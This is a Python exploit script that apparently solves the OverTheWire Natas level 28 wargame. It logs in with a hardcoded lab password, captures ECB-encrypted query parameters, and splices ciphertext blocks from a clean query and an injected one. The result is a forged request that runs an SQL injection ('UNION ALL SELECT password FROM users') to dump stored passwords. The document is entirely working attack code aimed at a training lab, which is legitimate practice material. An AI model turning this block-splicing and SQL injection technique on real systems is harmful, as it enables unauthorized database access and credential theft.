import requests
import base64
from requests.auth import HTTPBasicAuth
from urllib.parse import quote, urlparse, parse_qs

url = "http://natas28.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas28", "Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3")

# create a session object to maintain cookies and authentication between requests
session = requests.Session()
session.auth = auth

response = session.post(url, auth=auth, data={'query': 'a' * 9 + '\' UNION ALL SELECT password FROM users-- '})
malicious = base64.b64decode(parse_qs(urlparse(response.url).query)['query'][0])
print("Malicious")
for i in range(len(malicious) // 16):
    block = malicious[i * 16 : (i + 1) * 16]
    print(f"Malicious {i + 1}: {block}")

response = session.post(url, auth=auth, data={'query': 'a' * 10})
clean = base64.b64decode(parse_qs(urlparse(response.url).query)['query'][0])
print("Clean")
for i in range(len(clean) // 16):
    block = clean[i * 16 : (i + 1) * 16]
    print(f"Clean {i + 1}: {block}")

forged = clean[: (3 * 16)]
forged += malicious[3 * 16:]
print("Forged")
for i in range(len(forged) // 16):
    block = forged[i * 16 : (i + 1) * 16]
    print(f"Forged {i + 1}: {block}")

payload = base64.b64encode(forged).decode('utf-8')
print(payload)

exploit_url = "http://natas28.natas.labs.overthewire.org/search.php/"
response = session.get(exploit_url, auth=auth, params={"query": payload})
print(response.text)
print(response.url)